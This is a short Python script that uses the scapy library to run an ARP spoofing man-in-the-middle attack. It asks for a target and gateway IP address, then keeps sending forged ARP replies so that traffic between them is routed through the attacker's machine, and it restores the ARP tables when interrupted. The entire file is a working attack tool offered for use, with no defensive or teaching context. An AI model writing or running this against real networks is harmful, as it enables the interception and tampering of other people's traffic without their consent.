import scapy.all as scapy
import time

class ManInTheMIddle():
    def __init__(self):
        self.ip_target = ""
        self.ip_gateway = ""
        interval = 4
    
    def GetAttackInfo(self):
        self.ip_target = input("Target IP Address: ")
        self.ip_gateway = input("Gateway IP Address: ")
        self.interval = int(input("Enter the second interval between ARP messages: "))
    
    def poison(self):
        # Poison the target
        packet = scapy.ARP(op = 2, pdst = self.ip_target, hwdst = scapy.getmacbyip(self.ip_target), psrc = self.ip_gateway)
        scapy.send(packet, verbose = False)

        # Poison the gateway
        packet = scapy.ARP(op = 2, pdst = self.ip_gateway, hwdst = scapy.getmacbyip(self.ip_gateway), psrc = self.ip_target)
        scapy.send(packet, verbose = False)
    
    def heal(self):
        # heal thee gateway
        packet = scapy.ARP(op = 2, pdst = self.ip_gateway, hwdst = scapy.getmacbyip(self.ip_gateway), psrc = self.ip_target, hwsrc = scapy.getmacbyip(self.ip_target))
        scapy.send(packet, verbose = False)

        # heal the target
        packet = scapy.ARP(op = 2, pdst = self.ip_target, hwdst = scapy.getmacbyip(self.ip_target), psrc = self.ip_gateway, hwsrc = scapy.getmacbyip(self.ip_gateway))
        scapy.send(packet, verbose = False)
        
    def ConductAttack(self):
        self.GetAttackInfo()
        try:
            while True:
                self.poison()
                time.sleep(self.interval)
        except KeyboardInterrupt:
            self.heal()
            print("Healed")

attacker = ManInTheMIddle()
attacker.ConductAttack()